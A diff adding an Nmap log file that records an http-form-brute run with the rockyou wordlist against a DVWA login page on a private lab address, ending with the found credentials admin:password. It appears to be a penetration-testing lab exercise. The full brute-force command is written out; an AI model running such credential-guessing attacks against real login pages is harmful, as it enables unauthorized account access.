@@ -1,0 +1,14 @@
+# Nmap 7.95 scan initiated Fri Oct  3 16:43:00 2025 as: /usr/lib/nmap/nmap --privileged --script http-form-brute --script-args http-form-brute.path=/dvwa/login.php,http-form-brute.uservar=username,http-form-brute.passvar=password,passdb=/usr/share/wordlists/rockyou.txt,brute.retries=3,brute.threads=5 -p 80 -oN Desktop/nmap_brute_log.txt 192.168.100.10
+Nmap scan report for 192.168.100.10
+Host is up (0.00025s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-form-brute: 
+|   Accounts: 
+|     admin:password - Valid credentials
+|   Statistics: Performed 8618 guesses in 212 seconds, average tps: 41.4
+|_  ERROR: The service seems to have failed or is heavily firewalled...
+MAC Address: 52:54:00:50:8E:8C (QEMU virtual NIC)
+
+# Nmap done at Fri Oct  3 16:46:43 2025 -- 1 IP address (1 host up) scanned in 222.75 seconds
